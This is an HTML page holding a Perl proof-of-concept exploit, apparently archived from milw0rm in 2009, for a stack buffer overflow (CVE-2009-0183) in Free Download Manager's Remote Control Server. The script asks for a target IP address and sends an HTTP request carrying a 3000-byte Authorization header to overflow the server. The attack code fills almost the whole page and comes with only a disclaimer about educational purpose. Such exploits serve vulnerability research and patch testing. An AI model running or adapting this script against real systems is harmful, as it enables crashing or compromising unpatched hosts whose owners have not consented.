<html><head><title>Free Download Manager 2.5/3.0 (Authorization) Stack BOF PoC</title></head><pre>#!usr/bin/perl -w

#######################################################################################
#   Stack-based buffer overflow in Remote Control Server in Free Download Manager
#    (FDM) 2.5 Build 758 and 3.0 Build 844 allows remote attackers to execute
#    arbitrary code via a long Authorization header in an HTTP request.
#    Refer:
#    http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2009-0183
#
#    To run this exploit on MS Windows replace &quot;#!usr/bin/perl -w&quot; with
#     &quot;#!Installation_path_for_perl -w&quot; (say #!C:/Program Files/Perl/bin/perl -w)
#
#$$$$$This was strictly written for educational purpose. Use it at your own risk.$$$$$
#$$$$$Author will not bare any responsibility for any damages watsoever.$$$$$$$$$$$$$$
#
#        Author:    Praveen Darshanam
#        Email:     praveen[underscore]recker[at]sify.com\
#        Blog:        http://www.darshanams.blogspot.com/
#        Date:      04th February, 2009
#
########Thanx to str0ke,milw0rm, @rp m@n, and all the security folks####################
########################################################################################

use IO::Socket;

print(&quot;\nEnter IP Address of Remote Control Server(not domain) FDM: \n&quot;);
$vuln_host_ip = &lt;STDIN&gt;;


$sock_http = IO::Socket::INET-&gt;new(   PeerAddr =&gt; $vuln_host_ip,
                                     PeerPort =&gt; 80,
                                     Proto    =&gt; 'tcp') || &quot;Unable to create Socket for HTTP Connection&quot;;

$mal_buff=&quot;D&quot;x3000;

$http_attack = &quot;GET / HTTP/1.1\r\n&quot;.
&quot;Host: $vuln_host_ip\r\n&quot;.
&quot;Authorization:$mal_buff\r\n&quot;.
&quot;Keep-Alive: 300\r\n&quot;.
&quot;Connection: keep-alive\r\n\r\n&quot;;

print $sock_http $http_attack;

close($sock_http);

# milw0rm.com [2009-02-04]</pre></html>